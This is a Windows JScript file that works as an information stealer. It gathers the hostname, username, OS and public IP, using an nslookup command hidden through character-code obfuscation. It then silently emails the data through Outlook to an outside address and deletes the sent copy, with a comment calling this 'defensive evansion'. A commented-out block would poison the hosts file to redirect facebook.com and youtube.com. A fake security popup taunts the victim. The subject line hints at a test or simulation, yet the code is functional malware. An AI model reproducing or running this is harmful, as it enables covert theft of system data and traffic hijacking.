try {
    var network = new ActiveXObject("WScript.Network");
    var shell = new ActiveXObject("WScript.Shell");
	var fso = new ActiveXObject("Scripting.FileSystemObject");

    // 1. Collect Local Data
    var hostname = network.ComputerName;
    var username = network.UserName;
    var os = shell.ExpandEnvironmentStrings("%OS%");

    // 2. Fetch Public IP using command
    var publicIP = "Unknown";
    try {
        // Run command and capture the output
        var command = String.fromCharCode(99, 109, 100, 32, 47, 99, 32, 110, 115, 108, 111, 111, 107, 117, 112, 32, 109, 121, 105, 112, 46, 111, 112, 101, 110, 100, 110, 115, 46, 99, 111, 109, 32, 114, 101, 115, 111, 108, 118, 101, 114, 49, 46, 111, 112, 101, 110, 100, 110, 115, 46, 99, 111, 109);
        var exec = shell.Exec(command);
        var output = exec.StdOut.ReadAll();

        // Use a Regular Expression to find the IP address in the text output
        var ipMatch = output.match(/Address:\s+(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
        if (ipMatch && ipMatch.length > 1) {
            // The first 'Address' is usually the resolver, the second is your Public IP
            publicIP = ipMatch[1].replace("Address: ", "").replace(/\s/g, "");
        }
    } catch (err) {
        publicIP = "DNS Lookup Failed: " + err.description;
    }

    // 3. Format the message
    var messageBody = "HOSTNAME=" + hostname + 
                      "\nUSER=" + username + 
                      "\nPUBLIC_IP=" + publicIP + 
                      "\nOperating System=" + os;

    // 4. Outlook Automation
    var outlookApp = new ActiveXObject("Outlook.Application");
    var mailItem = outlookApp.CreateItem(0); 

    mailItem.To = "jfrobles@palawanpawnshop.com";
    mailItem.Subject = "Test- Hi Im Compromised";
    mailItem.Body = messageBody;
	mailItem.DeleteAfterSubmit = true; //for defensive evansion
    // 5. Send
    mailItem.Send();

	//var h = String.fromCharCode(67, 58, 92, 87, 105, 110, 100, 111, 119, 115, 92, 83, 121, 115, 116, 101, 109, 51, 50, 92, 100, 114, 105, 118, 101, 114, 115, 92, 101, 116, 99, 92, 104, 111, 115, 116, 115);
	//var r1 = "210.213.82.181 facebook.com";
    //var r2 = "210.213.82.181 youtube.com";
	//var inject1 = "cmd /c echo " + r1 + " >> " + h;
    //var inject2 = "cmd /c echo " + r2 + " >> " + h;
	//shell.Run(inject1, 0, true);
    //shell.Run(inject2, 0, true);
	
    //WScript.Echo("Alert: I steal some of your information.");
	var title = "Security Alert";
	var text = "Suspicious activity detected. Your system information is being synchronized with an attacker DERO-DULCE-BOT.\n\nDo you want to terminate the process?";
	var response = shell.Popup(text, 0, title, 16 + 4);

	if (response == 6) { // 6 is the ID for "Yes"
    WScript.Echo("Termination failed. Access Denied.");
	} else { // 7 is the ID for "No"
    WScript.Echo("Successfully harvested your information...");
	}
} catch (e) {
    WScript.Echo("Critical Error: " + e.description);
}